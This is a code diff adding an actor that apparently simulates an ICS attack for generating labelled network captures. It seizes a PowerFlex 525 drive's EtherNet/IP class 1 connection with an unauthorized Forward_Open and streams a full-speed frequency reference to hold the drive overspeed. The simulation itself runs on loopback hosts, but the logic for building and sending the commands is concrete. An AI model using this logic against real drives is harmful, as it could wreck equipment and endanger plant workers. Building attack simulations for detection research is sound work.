@@ -1356,3 +1356,121 @@ class EnipScanner(Actor):
     def close(self, rt) -> None:
         for key in [k for k in rt.clients if k[0] == self.id]:
             rt.clients.pop(key).close(graceful=False)
+
+
+# --- incident: unauthorized drive manipulation --------------------------------------------------
+
+def drive_output(reference_hz: float, command: int = CMD_START | CMD_FORWARD) -> bytes:
+    """O->T image that spins the drive: 32-bit run/idle header (run), Logic Command, Reference."""
+    return struct.pack("<I", RUN) + DRIVE_OUTPUT.pack(command, round(reference_hz * 100))
+
+
+class _OverspeedProgram:
+    """The rogue session's O->T image: a constant full-speed Logic Command + Reference the composer
+    streams on the seized connection until the end of the capture (the drive is held overspeed for
+    the rest of the shift). Mirrors the scanner's ``LineProgram`` interface (``output(t)``)."""
+
+    def __init__(self, reference_hz: float) -> None:
+        self.reference_hz = reference_hz
+        self._data = drive_output(reference_hz)
+
+    def output(self, t: float) -> bytes:
+        return self._data
+
+
+@register
+class EnipIoInjection(Actor):
+    """Unauthorized drive manipulation from a host outside the approved EtherNet/IP path: the
+    attacker registers an encapsulation session with a PowerFlex 525 adapter, issues an
+    unauthorized Forward_Open to seize its exclusive-owner class 1 connection and holds the
+    frequency Reference at full speed (O->T run/idle image) for the rest of the shift - the pump /
+    fan drive the CompactLogix line runs is spun past its process band. MITRE ATT&CK for ICS:
+    Unauthorized Command Message (T0855) and Manipulation of Control (T0831)."""
+
+    type = "enip.io_injection"
+
+    def plan(self) -> None:
+        plan, rng = self.plan_, self.rng
+        host = self.hosts[0]
+        target = rng.choice(plan.topology.select(self.param("targets")))
+        server, adapter = serving_adapter(plan, target.id)
+        self.adapters = {target.id: adapter}
+        rpi_ms = float(self.param("rpi_ms", 50))
+        rpi_us = round(rpi_ms * 1000)
+        if not DRIVE_MIN_RPI_US <= rpi_us <= 3_200_000:
+            raise ScenarioError(f"{self.id}: rpi_ms must be between {DRIVE_MIN_RPI_US / 1000:g} and 3200")
+        reference_hz = min(max(float(self.param("reference_hz", MAX_HZ)), 0.0), MAX_HZ)
+        writes = max(1, int(self.param("writes", 6)))
+        start_lo, start_hi = self.span(self.param("start", [0.4, 0.6]))
+        burst = min(float(self.param("burst", 0.6)), 2.0)
+        self.program = _OverspeedProgram(reference_hz)
+        t0 = plan.duration * rng.uniform(start_lo, start_hi)
+        t0 = min(t0, max(plan.duration - burst - 30, plan.duration * 0.1))
+        conn = {"ot_id": rng.getrandbits(32), "to_id": rng.getrandbits(32),
+                "serial": rng.randrange(1, 0x10000), "originator_serial": rng.getrandbits(32),
+                "context": rng.getrandbits(32), "rpi_us": rpi_us}
+        plan.add(t0, self.id, host.id, "enipii.connect", phase="setup", target=target.id,
+                 context=conn["context"])
+        opened = plan.add(t0 + rng.uniform(0.01, 0.05), self.id, host.id, "enipii.forward_open",
+                          target=target.id, ot_id=conn["ot_id"], to_id=conn["to_id"], serial=conn["serial"],
+                          originator_serial=conn["originator_serial"], rpi_us=rpi_us)
+        payload = self.program.output(0.0).hex()
+        commands, first = [], None
+        step = burst / writes
+        t = t0 + rng.uniform(0.08, 0.2)
+        for index in range(writes):
+            drive_t = t + index * step + rng.uniform(0.0, step * 0.3)
+            act = plan.add(drive_t, self.id, host.id, "enipii.drive", target=target.id, data=payload,
+                           rpi_us=rpi_us)
+            first = first or act
+            commands.append({"reference_hz": round(reference_hz, 2), "request": action_ref(act)})
+        # The connection is released only at teardown (after the capture), so the composer holds the
+        # overspeed O->T / T->O stream on the wire until the end of the shift.
+        plan.add(plan.duration + 1.0, self.id, host.id, "enipii.close", phase="teardown", target=target.id)
+        ot_id = adapter.connection_id(conn["serial"], ORIGINATOR_VENDOR, conn["originator_serial"])
+        plan.event(opened, self.id, f"Seize the PowerFlex 525 class 1 connection on {target.id}",
+                   ["T0855", "T0831"], reference_hz=round(reference_hz, 2),
+                   connection_serial=f"0x{conn['serial']:04x}")
+        plan.facts[self.id] = {
+            "source": host_ref(host.id),
+            "target": host_ref(target.id),
+            "drive": adapter.identity.facts().get("product_name"),
+            "service": "forward_open",
+            "service_code": SVC_FORWARD_OPEN,
+            "transport_class": 1,
+            "rpi_ms": rpi_ms,
+            "command_count": len(commands),
+            "commanded_reference_hz": sorted({f"{round(c['reference_hz'], 1)}" for c in commands}),
+            "max_reference_hz": round(reference_hz, 2),
+            "normal_max_reference_hz": round(MAX_HZ, 2),
+            "connection_serial": f"0x{conn['serial']:04x}",
+            "originator_vendor_id": ORIGINATOR_VENDOR,
+            "originator_serial": f"0x{conn['originator_serial']:08x}",
+            "ot_connection_id": f"0x{ot_id:08x}",
+            "to_connection_id": f"0x{conn['to_id']:08x}",
+            "io_port": IO_PORT,
+            "port": ENCAP_PORT,
+            "forward_open": action_ref(opened),
+            "first_command": action_ref(opened),
+            "first_drive": action_ref(first),
+        }
+
+    def execute(self, action, rt) -> None:
+        a = action.args
+        key = (self.id, action.host, a["target"])
+        if action.op == "enipii.connect":
+            source, target = rt.loopback(action.host), rt.loopback(a["target"])
+            scan = rt.clients[key] = _IoScan(EnipSession(source, target, a["context"]), source, target)
+            scan.session.register()
+        elif action.op == "enipii.forward_open":
+            rt.clients[key].open(a["ot_id"], a["to_id"], a["serial"], a["originator_serial"], a["rpi_us"])
+        elif action.op == "enipii.drive":
+            rt.clients[key].produce(bytes.fromhex(a["data"]))
+        elif action.op == "enipii.close":
+            rt.clients.pop(key).close(graceful=True)
+        else:
+            raise ValueError(f"unknown op {action.op}")
+
+    def close(self, rt) -> None:
+        for key in [k for k in rt.clients if k[0] == self.id]:
+            rt.clients.pop(key).close(graceful=False)
